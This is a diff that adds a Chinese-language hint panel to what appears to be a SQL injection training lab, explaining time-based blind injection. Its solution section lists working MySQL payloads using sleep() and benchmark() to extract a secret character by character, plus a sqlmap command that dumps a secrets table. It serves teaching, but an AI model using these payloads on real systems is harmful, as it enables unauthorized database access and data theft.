@@ -1,0 +1,19 @@
+<div class="hint-thought">
+<h4>思路提示</h4>
+<p>时间盲注是最"安静"的注入——页面文案、长度、状态码全都一样，<b>唯一信号是响应时间</b>。思路：用 <code>sleep()</code> 或 <code>benchmark()</code> 让条件为真时延迟若干秒，条件为假时不延迟，从而逐位判断数据。注意要用 <code>and</code> 而不是 <code>or</code>（<code>or</code> 左侧为真时会短路，sleep 根本不执行）。</p>
+</div>
+<details class="hint-detail">
+<summary>详细解题过程（点击展开）</summary>
+<div>
+<b>建立基线：</b>先访问 <code>?name=admin</code>，观察耗时（通常 &lt; 0.01 秒）。<br>
+<b>验证注入（页面会明显卡 3 秒）：</b><br>
+<code>?name=admin' and sleep(3)-- -</code><br>
+<b>条件判断（真才延迟）：</b><br>
+<code>?name=admin' and if(ascii(substr((select secret from secrets limit 1),1,1))=229,sleep(3),0)-- -</code><br>
+<b>二分法：</b><br>
+<code>?name=admin' and if(ascii(substr((select secret from secrets limit 1),1,1)&gt;200,sleep(3),0)-- -</code><br>
+<b>注意：</b>这里用 <code>and</code> 而不是 <code>or</code>——<code>or</code> 左侧为真时会短路，<code>sleep</code> 根本不执行，永远看不到延迟。<br>
+<b>替代延迟函数：</b><code>benchmark(1000000,md5('x'))</code><br>
+<b>自动化：</b><code>sqlmap -u "<?php echo site_url('modules/sqli/time.php'); ?>?name=admin" --technique=T -D bafanglab -T secrets --dump</code>
+</div>
+</details>
